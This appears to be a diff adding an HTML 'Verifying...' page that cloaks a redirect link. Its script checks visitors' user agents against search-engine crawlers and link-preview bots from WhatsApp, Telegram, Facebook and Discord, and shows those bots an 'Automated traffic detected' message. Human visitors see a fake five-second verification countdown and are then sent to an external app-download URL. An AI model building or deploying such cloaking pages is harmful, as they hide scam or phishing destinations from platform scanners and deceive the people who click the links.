@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Please Wait...</title>
+
+<style>
+body{
+    font-family:Arial,sans-serif;
+    background:#f5f5f5;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+    margin:0;
+}
+.card{
+    background:#fff;
+    padding:30px;
+    border-radius:12px;
+    box-shadow:0 5px 20px rgba(0,0,0,.1);
+    text-align:center;
+    width:320px;
+}
+button{
+    padding:12px 25px;
+    font-size:16px;
+    border:none;
+    background:#007bff;
+    color:#fff;
+    border-radius:8px;
+    cursor:pointer;
+}
+button:disabled{
+    background:#999;
+    cursor:not-allowed;
+}
+</style>
+</head>
+<body>
+
+<div class="card">
+<h2>Verifying...</h2>
+<p id="status">Please wait 5 seconds.</p>
+
+<button id="continueBtn" disabled>Continue</button>
+</div>
+
+<script>
+const target = "https://appsave.space/cl/i/271jok"; // ضع الرابط هنا
+
+const ua = navigator.userAgent.toLowerCase();
+
+const bots = [
+    "bot","crawler","spider","facebookexternalhit",
+    "whatsapp","telegrambot","discordbot","slurp",
+    "bingbot","googlebot"
+];
+
+let isBot = bots.some(b => ua.includes(b));
+
+if(isBot){
+    document.getElementById("status").innerHTML =
+        "Automated traffic detected.";
+}else{
+    let sec = 5;
+    const btn = document.getElementById("continueBtn");
+
+    const timer = setInterval(()=>{
+        sec--;
+        document.getElementById("status").innerHTML =
+            "Please wait "+sec+" seconds...";
+        if(sec<=0){
+            clearInterval(timer);
+            btn.disabled=false;
+            document.getElementById("status").innerHTML =
+                "Verification complete.";
+        }
+    },1000);
+
+    btn.onclick=()=>{
+        location.href=target;
+    };
+}
+</script>
+
+</body>
+</html>
